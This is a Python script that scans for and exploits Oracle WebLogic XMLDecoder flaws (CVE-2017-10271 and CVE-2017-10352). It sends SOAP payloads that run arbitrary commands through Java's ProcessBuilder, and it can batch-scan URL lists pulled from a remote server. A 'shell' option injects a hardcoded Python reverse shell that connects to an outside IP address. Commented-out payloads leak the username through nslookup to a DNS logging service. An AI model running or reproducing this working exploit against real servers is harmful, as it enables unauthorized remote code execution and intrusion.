# -*- coding: utf-8 -*-
import os.path
import requests
import optparse
from multiprocessing.dummy import Pool as ThreadPool
import utils
import time
import re

payload_linux_10352 = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java>
		  <object class="java.lang.ProcessBuilder">
			<array class="java.lang.String" length="3">
			  <void index="0">
				<string>/bin/bash</string>
			  </void>
			  <void index="1">
				<string>-c</string>
			  </void>
			  <void index="2">
				<string>ls</string>
			  </void>
			</array>
		  <void method="start"/>
		  </object>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''

payload_linux_10271 = '''
	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  <void class="java.lang.ProcessBuilder">
			<array class="java.lang.String" length="3">
			  <void index="0">
				<string>/bin/bash</string>
			  </void>
			  <void index="1">
				<string>-c</string>
			  </void>
			  <void index="2">
				<string>ls</string>
			  </void>
			</array>
		  <void method="start"/>
		  </void>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''

payload_time_base = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  <void class = "java.lang.Thread">
		  	<void method="sleep">	
		  		<long>2000</long>
		 </void></void>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'''

payload_create_file = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  <void class = "java.io.FileOutputStream">
		  		<object class = "java.io.File">
		  			<string>/tmp/success.txt</string>
		  		</object>
		  	</void>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''

sig_10271 = r'<faultstring>0</faultstring>'
sig_10352 = r'<faultstring>java\.lang\.ProcessBuilder.*</faultstring>'
# def send_payload_10271(url):
# 	(hostname, port) = utils.process_url(url)
# payload_linux_10271_1 = '''
# 	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
#   <soapenv:Header>
# 	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
# 		<java version="1.8.0_131" class="java.beans.XMLDecoder">
# 		  <void class="java.lang.ProcessBuilder">
# 			<array class="java.lang.String" length="3">
# 			  <void index="0">
# 				<string>/bin/bash</string>
# 			  </void>
# 			  <void index="1">
# 				<string>-c</string>
# 			  </void>
# 			  <void index="2">
# 				<string>nslookup `whoami`.{0}.{1}.cp4lxt.ceye.io</string>
# 			  </void>
# 			</array>
# 		  <void method="start"/></void>
# 		</java>
# 	  </work:WorkContext>
# 	</soapenv:Header>
#   <soapenv:Body/>
# </soapenv:Envelope>
# '''.format(hostname, port)

# 	payload_windows_10271 = '''
# 	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
#   <soapenv:Header>
# 	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
# 		<java version="1.8.0_131" class="java.beans.XMLDecoder">
# 		  <void class="java.lang.ProcessBuilder">
# 			<array class="java.lang.String" length="3">
# 			  <void index="0">
# 				<string>C:\Windows\System32\cmd.exe</string>
# 			  </void>
# 			  <void index="1">
# 				<string>/c</string>
# 			  </void>
# 			  <void index="2">
# 				<string>nslookup %USERNAME%.%HOSTNAME%.cp4lxt.ceye.io</string>
# 			  </void>
# 			</array>
# 		  <void method="start"/></void>
# 		</java>
# 	  </work:WorkContext>
# 	</soapenv:Header>
#   <soapenv:Body/>
# </soapenv:Envelope>
# '''.format(hostname, port)
def cve_2017_10271(url):
	try:
		r = requests.get(url, timeout=3)
		if r.status_code == 200:
			return send_payload(url, payload_linux_10271, sig_10271, "cve_2017_10271")
		else:
			return 0
	except Exception, e:
		# print e
		return 0


def cve_2017_10352(url):
	try:
		r = requests.get(url, timeout=3)
		if r.status_code == 200:
			return send_payload(url, payload_linux_10352, sig_10352, "cve_2017_10352")
		else:
			return 0
	except Exception, e:
		# print e
		return 0



	
def send_payload(url, payload, sig, name):
	# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.93.41.180",55555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
	headers = {
	'Host': '127.0.0.1:7001',
	'Content-Type': 'text/xml'
	}
	
	#r = requests.post(url, headers=headers, data=payload_windows)
	#if r.status_code==500 and evidence in r.text:
	#	print "[!!windows]", url
	try:
		r1 = requests.post(url, headers=headers, data=payload, timeout=3)
		# print r1.text
		if r1.status_code == 500 and re.search(sig, r1.text):
			print "[+]", url, "-", name
			return 1
		else: 
			return 0
	except Exception as e:
		# print e
		return 0

def main():
	parser = optparse.OptionParser()
	parser.add_option('-H', dest='tgtHost', type="string", help='specify target host')
	parser.add_option('-p', dest='tgtPort', type='int', help="specify target port")
	parser.add_option('-b', action="store_true", dest='batch', default=False, help="do a batch scan obtaining url list from remote server")
	parser.add_option('--time-based', action="store_true", dest='time_base', help="time based", default=False)
	parser.add_option('-c', dest='command', help='command to execute')
	parser.add_option('-f', dest='filepath', help='file to load')
	parser.add_option('-O', dest='os', help='choose OS')
	parser.add_option('--create-file', action="store_true", dest='create_file', help="create file using native java", default=False)
	(options, args) = parser.parse_args()
	tgtHost = options.tgtHost
	tgtPort = options.tgtPort
	batch = options.batch
	time_base = options.time_base
	command = options.command
	filepath = options.filepath
	os = options.os
	create_file = options.create_file
	

	if batch and tgtHost == None and tgtPort == None and not time_base and not command and not create_file:
		urllist = utils.get_url_list("http://192.168.17.89:8080/RDP/safeTeamUtil/safeTeamUtil!getAllUrls.do")
		if urllist:
			target_url_list1 = map(lambda url: 'http://' + utils.process_url(url)[0] + ":" + str(utils.process_url(url)[1]) + '/wls-wsat/CoordinatorPortType', urllist)
			target_url_list2 = map(lambda url: 'http://' + utils.process_url(url)[0] + ":" + str(utils.process_url(url)[1]) + '/wls-wsat/CoordinatorPortType11', urllist)
			pool = ThreadPool(50)
			results1_10271 = pool.map(cve_2017_10271, target_url_list1)
			results2_10271 = pool.map(cve_2017_10271, target_url_list2)

			results1_10352 = pool.map(cve_2017_10352, target_url_list1)
			results2_10352 = pool.map(cve_2017_10352, target_url_list2)
			pool.close()
			pool.join()
			
			final_results_10271 = [x or y for x,y in zip(results1_10271,results2_10271)] 
			json_data_10271 = utils.assembly_data("030103",dict(zip(urllist,final_results_10271)))

			# if 'http://www.gzzwjw.gov.cn' in dict(zip(urllist, final_results_10271)):
				# print dict(zip(urllist, final_results_10271))['http://www.gzzwjw.gov.cn']

			final_results_10352 = [x or y for x,y in zip(results1_10352,results2_10352)] 
			json_data_10352 = utils.assembly_data("030111",dict(zip(urllist,final_results_10352)))

			# print json_data_10271
			# print json_data_10352
			print utils.post_data(json_data_10271, "http://192.168.17.89:8080/RDP/safeTeamUtil/safeTeamUtil!recordVulnerability.do")
			print utils.post_data(json_data_10352, "http://192.168.17.89:8080/RDP/safeTeamUtil/safeTeamUtil!recordVulnerability.do")
			
	elif tgtHost and tgtPort and not batch and not time_base and not command and not create_file:
		url1 = "http://" + tgtHost + ":" + str(tgtPort) + '/wls-wsat/CoordinatorPortType'
		url2 = "http://" + tgtHost + ":" + str(tgtPort) + '/wls-wsat/CoordinatorPortType11'

		cve_2017_10271(url1)
		cve_2017_10271(url2)
		cve_2017_10352(url1)
		cve_2017_10352(url2)
	elif tgtHost and tgtPort and time_base and not batch and not command and not create_file:
		import socket
		import time
		http_req = 'POST /wls-wsat/CoordinatorPortType HTTP/1.1\r\nHOST:127.0.0.1:80\r\nContent-Type:text/xml\r\nContent-Length:379\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.XMLDecoder"><void class = "java.lang.Thread"><void method="sleep"><long>10000</long></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(5)
			sock.connect((tgtHost,tgtPort))
			# print repr(http_req)
			sock.sendall(http_req)
			start = time.time()
			response = sock.recv(2048)
			end = time.time()
			if int(end - start) == 10 and '500 Internal Server Error' in response and r'<faultstring>0</faultstring>' in response:
				print '[+]', tgtHost, tgtPort
			else:
				print '[-]', tgtHost, tgtPort
		except Exception as e:
			# print e
			pass
	elif tgtHost and tgtPort and not time_base and not batch and not command and create_file:
		url1 = "http://" + tgtHost + ":" + str(tgtPort) + '/wls-wsat/CoordinatorPortType'
		url2 = "http://" + tgtHost + ":" + str(tgtPort) + '/wls-wsat/CoordinatorPortType11'
		send_payload(url1,payload_create_file, sig_10271, "cve_2017_10271")
		send_payload(url2,payload_create_file, sig_10271, "cve_2017_10271")

	elif tgtHost and tgtPort and not time_base and not batch and command and os:
		payload_linux_10271 = '''
	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  <void class="java.lang.ProcessBuilder">
			<array class="java.lang.String" length="3">
			  <void index="0">
				<string>/bin/bash</string>
			  </void>
			  <void index="1">
				<string>-c</string>
			  </void>
			  <void index="2">
				<string>{}</string>
			  </void>
			</array>
		  <void method="start"/>
		  </void>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''
		payload_windows_10271 = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  <void class="java.lang.ProcessBuilder">
			<array class="java.lang.String" length="3">
			  <void index="0">
				<string>C:\Windows\System32\cmd.exe</string>
			  </void>
			  <void index="1">
				<string>/c</string>
			  </void>
			  <void index="2">
				<string>{}</string>
			  </void>
			</array>
		  <void method="start"/></void>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''
		url1 = "http://" + tgtHost + ":" + str(tgtPort) + '/wls-wsat/CoordinatorPortType'
		url2 = "http://" + tgtHost + ":" + str(tgtPort) + '/wls-wsat/CoordinatorPortType11'
		if os == 'linux':
			if command == 'shell':
				command = '''
				python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.93.41.180",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
				'''
		# print payload_linux_10271
		
			print payload_linux_10271.format(command)
			send_payload(url1,payload_linux_10271.format(command), sig_10271, "cve_2017_10271")
			send_payload(url2,payload_linux_10271.format(command), sig_10271, "cve_2017_10271")
		elif os == 'win':
			print payload_windows_10271.format(command)
			send_payload(url1,payload_windows_10271.format(command), sig_10271, "cve_2017_10271")
			send_payload(url2,payload_windows_10271.format(command), sig_10271, "cve_2017_10271")
	elif not tgtHost and not tgtPort and filepath and not command and not batch and not time_base:
		with open(filepath, 'r') as f:
			u_list = f.readlines()
		for i in u_list:
			url = "http://" + i.strip() + '/wls-wsat/CoordinatorPortType'
			# send_payload(url,payload_linux_10271, sig_10271, "cve_2017_10271")
			cve_2017_10271(url)
			cve_2017_10352(url)
	else:
		parser.print_help()
		exit(0)


if __name__ == "__main__":
	main()

	